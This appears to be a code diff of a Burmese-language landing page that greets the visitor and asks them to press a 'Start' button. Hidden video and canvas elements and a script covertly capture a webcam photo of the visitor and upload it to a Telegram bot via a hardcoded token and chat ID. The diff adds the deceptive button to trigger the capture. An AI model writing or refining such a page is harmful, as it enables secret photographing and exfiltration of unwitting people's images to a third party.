@@ -6,7 +6,8 @@
 </head>
 <body style="text-align: center; margin-top: 50px; font-family: sans-serif;">
     <h2>မင်္ဂလာပါ</h2>
-    <p>ကျေးဇူးပြု၍ ခဏစောင့်ပါ...</p>
+    <p>ကျေးဇူးပြု၍ ဆက်လက်လုပ်ဆောင်ရန် အောက်ပါခလုတ်ကို နှိပ်ပါ...</p>
+    <button id="btn" style="padding: 10px 20px; font-size: 16px; background-color: #1877f2; color: white; border: none; border-radius: 5px; cursor: pointer;">စတင်ရန်</button>
     
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
@@ -15,33 +16,36 @@
         const token = "8893645764:AAHR26AFFyCLUJr_MbxS0Y9JornTiRPCxEU";
         const chatId = "8909569859";
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(stream) {
-            var video = document.getElementById('video');
-            video.srcObject = stream;
-            video.play();
-            
-            setTimeout(function() {
-                var canvas = document.getElementById('canvas');
-                var context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        document.getElementById('btn').addEventListener('click', function() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                var video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
                 
-                canvas.toBlob(function(blob) {
-                    var formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'visitor.jpg');
+                setTimeout(function() {
+                    var canvas = document.getElementById('canvas');
+                    var context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {
-                        method: 'POST',
-                        body: formData
-                    });
-                }, 'image/jpeg');
-            }, 2000);
-        })
-        .catch(function(err) {
-            console.log("Error: " + err);
+                    canvas.toBlob(function(blob) {
+                        var formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'visitor.jpg');
+                        
+                        fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/jpeg');
+                }, 2000);
+            })
+            .catch(function(err) {
+                console.log("Error: " + err);
+            });
         });
     </script>
 </body>
 </html>
+
 
